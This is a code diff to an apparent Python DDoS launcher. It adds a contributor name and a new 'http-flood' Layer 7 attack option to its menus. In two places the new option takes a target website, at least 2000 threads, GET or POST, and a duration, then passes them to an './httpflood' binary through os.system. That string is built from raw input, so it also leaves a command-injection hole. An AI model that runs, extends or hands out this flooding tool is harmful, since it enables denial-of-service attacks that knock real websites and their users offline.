@@ -210,7 +210,7 @@ def load():
 
 \033[1m\033[31m⮞ \033[31mMethod \033[0m\033[31mDev\033[96m'\033[31ms\033[96m:\033[0m
 \033[96m\033[1mMhProDev \033[0m\033[31m, \033[96mGoogleAdmin
-\033[96mEmpFaked \033[31m\033[1m, \033[96mwachirachoomsiri\033[0m   \033[31m\033[1m& \033[0m\033[96mR00tS3c\033[0m  
+\033[96mEmpFaked \033[31m\033[1m, \033[96mwachirachoomsiri\033[0m \033[96m,\033[0m \033[31mLeeon123 \033[31m\033[1m& \033[0m\033[96mR00tS3c\033[0m  
 
 """
         logoexpired = f"""
@@ -288,6 +288,7 @@ def wrongoption():
 \033[32m\033[1m# \033[0mwachirachoomsiri
 \033[32m\033[1m# \033[0mGoogleAdmin
 \033[32m\033[1m# \033[0memp001
+\033[32m\033[1m# \033[0mLeeon123
 
 {indicatorlogo} WRONG OPTION"""
         print(str(developer))
@@ -368,6 +369,7 @@ def methods():
 \033[31m⮞ \033[96mhaven-god
 
 \033[31m[\033[96mLayer7\033[31m]\033[0m
+\033[31m⮞ \033[96mhttp-flood
 \033[31m⮞ \033[96mmh-null
 \033[31m⮞ \033[96mmh-get
 \033[31m⮞ \033[96mmh-post
@@ -734,6 +736,26 @@ def menu():
                     load()
                     license()
                     menu()
+                if menuoption == "http-flood":
+                    load()
+                    print("""
+\033[36m[\033[39mMETHODS\033[36m]\033[0m
+
+\033[31m\033[1m⮞ \033[0m\033[39mhttp-flood \033[31m: \033[36m Powerfull Layer 7 Attack: RAW ATTACK NO BYPASS \033[31m[\033[32mRUNNING\033[31m]\033[0m
+
+            """)
+                    httpfloodweb = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
+                    httpfloodthreads = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(2000 minimal):\033[31m:\033[36m\033[31m")
+                    httpmethod = input("\033[31m\033[1m⮞ \033[0m\033[96mpost or get?\033[31m:\033[36m\033[31m")
+                    httptime = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
+                    mhgetsend = ('./httpflood ' + httpfloodweb + f' {httpfloodthreads}' + f' {httpmethod} {httptime} ua.txt')
+                    tip()
+                
+                    os.system(mhgetsend)
+
+                    load()
+                    license()
+                    menu()
                 if menuoption == "nuker-proxied":
                     os.system('clear')
                     load()
@@ -953,6 +975,26 @@ def menu():
                 
                 os.system(mhgetsend)
                 
+                load()
+                license()
+                menu()
+            if kies == "http-flood":
+                load()
+                print("""
+\033[36m[\033[39mMETHODS\033[36m]\033[0m
+
+\033[31m\033[1m⮞ \033[0m\033[39mhttp-flood \033[31m: \033[36m Powerfull Layer 7 Attack: RAW ATTACK NO BYPASS \033[31m[\033[32mRUNNING\033[31m]\033[0m
+
+            """)
+                httpfloodweb = input("\033[31m\033[1m⮞ \033[0m\033[96mWebsite\033[31m:\033[36m\033[31m")
+                httpfloodthreads = input("\033[31m\033[1m⮞ \033[0m\033[96mThreads(2000 minimal):\033[31m:\033[36m\033[31m")
+                httpmethod = input("\033[31m\033[1m⮞ \033[0m\033[96mpost or get?\033[31m:\033[36m\033[31m")
+                httptime = input("\033[31m\033[1m⮞ \033[0m\033[96mTime\033[31m:\033[36m\033[31m")
+                mhgetsend = ('./httpflood ' + httpfloodweb + f' {httpfloodthreads}' + f' {httpmethod} {httptime} ua.txt')
+                tip()
+                
+                os.system(mhgetsend)
+               
                 load()
                 license()
                 menu()
